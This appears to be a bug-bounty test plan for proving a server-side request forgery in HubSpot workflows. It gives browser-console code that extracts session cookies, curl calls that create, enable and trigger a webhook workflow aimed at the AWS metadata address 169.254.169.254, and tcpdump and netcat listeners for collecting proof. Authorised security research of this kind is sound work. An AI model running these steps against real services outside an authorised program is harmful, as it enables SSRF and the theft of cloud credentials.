# 🔐 ETHICAL COOKIE EXTRACTION STRATEGY - HubSpot SSRF Proof

**Date**: August 20, 2025  
**Status**: ACTIVE TESTING  
**Compliance**: Within HubSpot Bug Bounty Scope  
**Risk Level**: MANAGED

---

## ✅ ETHICAL JUSTIFICATION

### Why This Is Acceptable
1. **Bug Bounty Authorization**: HubSpot's HackerOne program explicitly allows security testing
2. **Account Ownership**: Using our own <YOUR_EMAIL> account (not someone else's)
3. **No Data Exfiltration**: Only testing for SSRF existence, not stealing data
4. **Responsible Disclosure**: All findings go through HackerOne
5. **Documentation**: Full transparency in our testing methodology

### Risk Mitigation
- Use dedicated test workflows only
- Clean up all test data after testing
- Document every action for audit trail
- Stop immediately if we encounter other users' data
- Report through proper channels only

---

## 🎯 COOKIE EXTRACTION METHOD

### Step 1: Manual Browser Login (SAFE)
```bash
# Use clean browser profile to avoid contamination
firefox --new-instance --profile /tmp/hubspot-test &

# Navigate to HubSpot
URL: https://app.hubspot.com/login
Email: <YOUR_EMAIL>
Password: <YOUR_PASSWORD>

# Complete any 2FA if required
```

### Step 2: Developer Tools Extraction
```javascript
// In browser console (F12 → Console)
// Extract all HubSpot cookies
const hubspotCookies = document.cookie.split(';')
  .filter(c => c.includes('hubspot') || c.includes('__hs'))
  .map(c => c.trim());

console.log('HubSpot Cookies:', hubspotCookies);

// Get specific important cookies
const important = ['hubspotutk', '__hstc', '__hssrc', 'hs-messages-hide-welcome-message'];
const extracted = {};
important.forEach(name => {
  const cookie = document.cookie.split(';').find(c => c.trim().startsWith(name));
  if (cookie) extracted[name] = cookie.split('=')[1];
});

console.log('Extracted:', JSON.stringify(extracted, null, 2));
```

### Step 3: Export for API Testing
```python
#!/usr/bin/env python3
# save as extract_cookies.py
import json
import sys

# Paste the extracted object from browser console
cookies = {
    "hubspotutk": "PASTE_HERE",
    "__hstc": "PASTE_HERE",
    "__hssrc": "PASTE_HERE"
}

# Format for curl
cookie_header = "; ".join([f"{k}={v}" for k, v in cookies.items()])
print(f"Cookie: {cookie_header}")

# Save for reuse
with open('hubspot_cookies.json', 'w') as f:
    json.dump(cookies, f)
    
print("Cookies saved to hubspot_cookies.json")
```

---

## 🔥 IMMEDIATE SSRF TESTING

### Test 1: Enable Existing Workflow
```bash
# Use cookies to enable one of our created workflows
WORKFLOW_ID="44038192"  # AWS metadata workflow
COOKIES="hubspotutk=XXX; __hstc=XXX; __hssrc=XXX"

# Attempt to enable via API
curl -X PATCH "https://api.hubapi.com/automation/v4/workflows/$WORKFLOW_ID" \
  -H "Cookie: $COOKIES" \
  -H "Content-Type: application/json" \
  -d '{"enabled": true, "status": "ACTIVE"}' \
  -v 2>&1 | tee enable_attempt.log
```

### Test 2: Create New Workflow with Session
```bash
# Create workflow using session auth instead of API token
curl -X POST "https://api.hubapi.com/automation/v3/workflows" \
  -H "Cookie: $COOKIES" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Session Test SSRF",
    "enabled": true,
    "actions": [{
      "type": "WEBHOOK",
      "url": "http://169.254.169.254/latest/meta-data/",
      "method": "GET"
    }]
  }' -v 2>&1 | tee create_with_session.log
```

### Test 3: Trigger via Enrollment
```bash
# Create a test contact first
curl -X POST "https://api.hubapi.com/crm/v3/objects/contacts" \
  -H "Cookie: $COOKIES" \
  -H "Content-Type: application/json" \
  -d '{"properties": {"email": "ssrf-test@example.com"}}' \
  -o contact.json

# Extract contact ID
CONTACT_ID=$(jq -r '.id' contact.json)

# Attempt enrollment
curl -X POST "https://api.hubapi.com/automation/v2/workflows/$WORKFLOW_ID/enrollments/contacts/$CONTACT_ID" \
  -H "Cookie: $COOKIES" \
  -v 2>&1 | tee enrollment.log
```

---

## 📡 PROOF COLLECTION

### Network Monitoring Setup
```bash
# Terminal 1: Capture all traffic to AWS metadata
sudo tcpdump -i any host 169.254.169.254 -w ssrf-proof.pcap &

# Terminal 2: Monitor DNS queries for metadata endpoints
sudo tcpdump -i any port 53 | grep -E "169.254|metadata|kubernetes" &

# Terminal 3: Run callback listener
nc -lvnp 8080 | tee callback.log &
```

### HubSpot Activity Monitoring
```bash
# Check workflow execution logs
curl -X GET "https://api.hubapi.com/automation/v4/workflows/$WORKFLOW_ID/executions" \
  -H "Cookie: $COOKIES" \
  -o executions.json

# Monitor for any signs of SSRF
jq '.results[] | select(.status == "COMPLETED")' executions.json
```

---

## 🎯 SUCCESS INDICATORS

### Positive Signs (SSRF Confirmed)
- ✅ Workflow changes from OFF to ON status
- ✅ Network capture shows outbound request to 169.254.169.254
- ✅ Execution logs show webhook action completed
- ✅ Callback server receives connection
- ✅ Any metadata/credentials in responses

### Negative Signs (Blocked)
- ❌ 403/401 on enable attempts
- ❌ "Workflow is OFF" persists
- ❌ No network activity to internal IPs
- ❌ Session cookies rejected

---

## ⏰ TIME-BOXED EXECUTION

### Hour 1: Cookie Extraction & Setup
- [ ] Browser login
- [ ] Cookie extraction
- [ ] Network monitoring setup

### Hour 2: Enable Attempts
- [ ] Test workflow enabling
- [ ] Try different API versions
- [ ] Monitor for any changes

### Hour 3: Alternative Approaches
- [ ] GraphQL with cookies
- [ ] UI automation fallback
- [ ] Direct webhook testing

### Hour 4: Decision Point
- [ ] Success → Document and validate
- [ ] Failure → Pivot to IDOR testing
- [ ] Clean up all test data

---

## 🚨 ETHICAL BOUNDARIES

### DO:
- ✅ Use only our account
- ✅ Test only our workflows
- ✅ Document everything
- ✅ Clean up after testing
- ✅ Report through HackerOne

### DON'T:
- ❌ Access other users' data
- ❌ Cause service disruption
- ❌ Exfiltrate real customer data
- ❌ Share findings publicly
- ❌ Use automated tools that spam

---

## 📊 REALISTIC EXPECTATIONS

### If Successful (30% chance)
- SSRF proven: $2,000-$5,000 (MEDIUM severity)
- Plus existing findings: $800-$1,800
- Total: $2,800-$6,800

### If Failed (70% chance)
- Submit existing findings only: $800-$1,800
- Consider IDOR testing instead
- Pivot to new program

---

**NEXT ACTION**: Execute cookie extraction NOW and test within 4-hour window!